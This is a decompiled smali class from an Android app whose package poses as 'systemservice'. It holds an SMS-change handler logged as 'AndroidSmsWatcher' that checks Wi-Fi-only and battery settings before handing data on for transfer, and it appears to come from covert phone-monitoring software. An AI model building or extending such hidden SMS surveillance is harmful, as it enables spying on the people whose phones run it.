.class Lcom/systemservice/a/c/h/e;
.super Ljava/lang/Object;
.source ""

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/systemservice/a/c/h/f;->onChange(Z)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Lcom/systemservice/a/h/k;

.field final synthetic b:Lcom/systemservice/a/c/h/f;


# direct methods
.method constructor <init>(Lcom/systemservice/a/c/h/f;Lcom/systemservice/a/h/k;)V
    .locals 0

    iput-object p1, p0, Lcom/systemservice/a/c/h/e;->b:Lcom/systemservice/a/c/h/f;

    iput-object p2, p0, Lcom/systemservice/a/c/h/e;->a:Lcom/systemservice/a/h/k;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 3

    iget-object v0, p0, Lcom/systemservice/a/c/h/e;->b:Lcom/systemservice/a/c/h/f;

    iget-object v0, v0, Lcom/systemservice/a/c/h/f;->a:Landroid/content/Context;

    const/4 v1, 0x0

    const-string v2, "sending_sms"

    invoke-static {v0, v2, v1}, Lcom/systemservice/a/a/l;->a(Landroid/content/Context;Ljava/lang/String;Z)Z

    move-result v0

    if-nez v0, :cond_3

    iget-object v0, p0, Lcom/systemservice/a/c/h/e;->b:Lcom/systemservice/a/c/h/f;

    iget-object v0, v0, Lcom/systemservice/a/c/h/f;->b:Lcom/systemservice/a/c/h/g;

    invoke-static {v0}, Lcom/systemservice/a/c/h/g;->a(Lcom/systemservice/a/c/h/g;)Landroid/content/SharedPreferences;

    move-result-object v0

    const-string v2, "media_data_transfered_by_wifi_only"

    invoke-interface {v0, v2, v1}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v0

    const-string v2, "save_battery"

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/systemservice/a/c/h/e;->b:Lcom/systemservice/a/c/h/f;

    iget-object v0, v0, Lcom/systemservice/a/c/h/f;->b:Lcom/systemservice/a/c/h/g;

    invoke-static {v0}, Lcom/systemservice/a/c/h/g;->a(Lcom/systemservice/a/c/h/g;)Landroid/content/SharedPreferences;

    move-result-object v0

    invoke-interface {v0, v2, v1}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v0

    if-nez v0, :cond_0

    iget-object v0, p0, Lcom/systemservice/a/c/h/e;->b:Lcom/systemservice/a/c/h/f;

    iget-object v0, v0, Lcom/systemservice/a/c/h/f;->a:Landroid/content/Context;

    invoke-static {v0}, Lcom/systemservice/a/a/h;->c(Landroid/content/Context;)Z

    move-result v0

    if-nez v0, :cond_0

    const-string v0, "AndroidSmsWatcher"

    const-string v1, "WiFi ONLY = false"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    return-void

    :cond_0
    iget-object v0, p0, Lcom/systemservice/a/c/h/e;->b:Lcom/systemservice/a/c/h/f;

    iget-object v0, v0, Lcom/systemservice/a/c/h/f;->a:Landroid/content/Context;

    invoke-static {v0}, Lcom/systemservice/common/features/settingHistory/b;->c(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_2

    iget-object v0, p0, Lcom/systemservice/a/c/h/e;->b:Lcom/systemservice/a/c/h/f;

    iget-object v0, v0, Lcom/systemservice/a/c/h/f;->b:Lcom/systemservice/a/c/h/g;

    invoke-static {v0}, Lcom/systemservice/a/c/h/g;->a(Lcom/systemservice/a/c/h/g;)Landroid/content/SharedPreferences;

    move-result-object v0

    invoke-interface {v0, v2, v1}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v0

    if-eqz v0, :cond_1

    iget-object v0, p0, Lcom/systemservice/a/c/h/e;->b:Lcom/systemservice/a/c/h/f;

    iget-object v0, v0, Lcom/systemservice/a/c/h/f;->a:Landroid/content/Context;

    invoke-static {v0}, Lcom/systemservice/a/a/h;->b(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_3

    iget-object v0, p0, Lcom/systemservice/a/c/h/e;->b:Lcom/systemservice/a/c/h/f;

    iget-object v0, v0, Lcom/systemservice/a/c/h/f;->b:Lcom/systemservice/a/c/h/g;

    invoke-static {v0}, Lcom/systemservice/a/c/h/g;->a(Lcom/systemservice/a/c/h/g;)Landroid/content/SharedPreferences;

    move-result-object v0

    const-string v2, "battery"

    invoke-interface {v0, v2, v1}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v0

    if-eqz v0, :cond_3

    :cond_1
    iget-object v0, p0, Lcom/systemservice/a/c/h/e;->b:Lcom/systemservice/a/c/h/f;

    iget-object v1, v0, Lcom/systemservice/a/c/h/f;->b:Lcom/systemservice/a/c/h/g;

    iget-object v0, v0, Lcom/systemservice/a/c/h/f;->a:Landroid/content/Context;

    iget-object v2, p0, Lcom/systemservice/a/c/h/e;->a:Lcom/systemservice/a/h/k;

    invoke-static {v1, v0, v2}, Lcom/systemservice/a/c/h/g;->a(Lcom/systemservice/a/c/h/g;Landroid/content/Context;Lcom/systemservice/a/h/k;)V

    goto :goto_0

    :cond_2
    const/4 v0, 0x1

    sput-boolean v0, Lcom/systemservice/a/a/j;->c:Z

    :cond_3
    :goto_0
    return-void
.end method
